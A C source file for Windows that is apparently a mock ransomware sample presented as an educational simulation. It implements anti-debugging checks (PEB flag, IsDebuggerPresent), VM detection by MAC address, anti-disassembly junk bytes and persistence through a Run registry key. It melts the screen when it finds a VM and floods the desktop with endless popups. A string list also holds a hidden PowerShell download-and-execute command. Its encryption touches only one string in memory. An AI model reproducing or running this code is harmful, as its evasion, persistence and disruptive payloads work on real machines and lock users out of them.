#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <time.h> // needed for rand()

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib") // needed for screen melting effect

// --- FAKE IOCs ---

volatile const char* dummy_strings[] = {
    "https://example.com/payload.bin",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "dGhpc2lzc3RyaW5n", 
    "wallet.dat",
    "OpenCL error: failed to allocate buffer",
    "smb://%s/IPC$",
    "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')\"",
    "CVE-2021-34527",
    "DANGER_RANSOMWARE_MUTEX_01",
    "UHJlcGFyZSB0byBiZWNvbWUgYSBjeWJlcnNlY3VyaXR5IHByb2Zlc3Npb25hbCBpbiBhIGdyYWR1YXRlIHByb2dyYW0gdGhhdCBjb21iaW5lcyBhZHZhbmNlZCBzdHVkaWVzIGluIGNvbXB1dGVyIHNjaWVuY2UgdGVjaG5pcXVlcyB3aXRoIGN1dHRpbmctZWRnZSBjeWJlcnNlY3VyaXR5IHRlY2hub2xvZ2llcyBhbmQgcHJhY3RpY2VzLg==",
    "cmd.exe",
    NULL
};

// --- 1. ANTI-ANALYSIS ---

// check PEB directly using inline asm to avoid basic API hooks
BOOL CheckPEB_BeingDebugged() {
    unsigned char isPresent = 0;
    __asm__ volatile (
        "movl %%fs:0x30, %%eax\n\t"
        "movb 0x2(%%eax), %%al\n\t"
        "movb %%al, %0\n\t"
        : "=r" (isPresent)
        :
        : "%eax"
    );
    return isPresent != 0;
}

// check for known vmware/vbox mac addresses
BOOL CheckVM_MAC() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    
    if (dwStatus != ERROR_SUCCESS) return FALSE;

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    while (pAdapterInfo) {
        // vmware macs
        if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x05 && pAdapterInfo->Address[2] == 0x69) return TRUE;
        if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x0C && pAdapterInfo->Address[2] == 0x29) return TRUE;
        if (pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x50 && pAdapterInfo->Address[2] == 0x56) return TRUE;
        // vbox mac
        if (pAdapterInfo->Address[0] == 0x08 && pAdapterInfo->Address[1] == 0x00 && pAdapterInfo->Address[2] == 0x27) return TRUE;
        
        pAdapterInfo = pAdapterInfo->Next;
    }
    return FALSE;
}

// --- VISUAL EFFECTS PAYLOADS ---

// classic melting screen gdi payload
void MeltScreen() {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    srand((unsigned int)time(NULL));

    while(1) {
        int x = rand() % w;
        int y = rand() % 15;
        int width = rand() % 150;
        
        // copy a slice of the screen and shift it down slightly
        BitBlt(hdc, x, y, width, h, hdc, x, 0, SRCCOPY);
        Sleep(10); // control the speed of the melt
    }
}

// thread worker for popups so we don't block the main loop
DWORD WINAPI PopupThread(LPVOID lpParam) {
    MessageBoxA(NULL, "Oops! Your files have been encrypted!\n\n(Just kidding, this is an educational simulation!)", "Not_A_Virus.exe", MB_ICONWARNING | MB_OK);
    return 0;
}

// --- 2. ANTI-DISASSEMBLY ---

void OpaquePredicateAndJunk() {
    // opaque predicate. tick is always > 0, but static tools get confused.
    DWORD tick = GetTickCount();
    if (tick == 0) {
        ExitProcess(0);
        // rogue jump / junk bytes
        __asm__ volatile (
            "jmp .+5\n\t"
            ".byte 0xE8\n\t" 
        );
    }
}

// --- 3. PERSISTENCE ---

void InstallPersistence() {
    char szExePath[MAX_PATH];
    char szDestPath[MAX_PATH];
    char szAppData[MAX_PATH];
    HKEY hKey;

    GetModuleFileNameA(NULL, szExePath, MAX_PATH);
    ExpandEnvironmentStringsA("%APPDATA%", szAppData, MAX_PATH);
    snprintf(szDestPath, MAX_PATH, "%s\\win_update_mock.exe", szAppData);

    CopyFileA(szExePath, szDestPath, FALSE);

    // write to registry run key
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WinUpdateMock", 0, REG_SZ, (const BYTE*)szDestPath, strlen(szDestPath) + 1);
        RegCloseKey(hKey);
    }
}

// --- 4. BENIGN PAYLOAD (CRYPTO) ---

void ExecuteBenignPayload() {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    
    // fake string to encrypt in memory
    char targetString[] = "This would be all of your files! Educational PoC is watching.";
    DWORD dataLen = strlen(targetString);
    char password[] = "supersecretpassword";

    // rc4 encryption via cryptoapi
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
            CryptHashData(hHash, (BYTE*)password, strlen(password), 0);
            if (CryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
                // do the actual string encryption
                CryptEncrypt(hKey, 0, TRUE, 0, (BYTE*)targetString, &dataLen, sizeof(targetString));
                CryptDestroyKey(hKey);
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }

    // flood the screen with popups
    while(1) {
        CreateThread(NULL, 0, PopupThread, NULL, 0, NULL);
        Sleep(150); // spawn a new popup every 150ms
    }
}

int main() {
    // 1. recon & anti-analysis
    if (IsDebuggerPresent() || CheckPEB_BeingDebugged()) {
        // Display a Top-Most Error MessageBox if debugging is detected
        MessageBoxA(NULL, 
                    "Debugger Detected! Nice try...", 
                    "Anti-Debugging Triggered", 
                    MB_ICONERROR | MB_OK | MB_TOPMOST);
        return 0; 
    }

    if (CheckVM_MAC()) {
        // if we are in a sandbox/VM, melt the screen and hang!
        MeltScreen();
    }

    // 2. anti-disassembly junk
    OpaquePredicateAndJunk();

    // 3. persistence
    InstallPersistence();

    // 4. execute payload (crypto + infinite popups)
    ExecuteBenignPayload();

    return 0;
}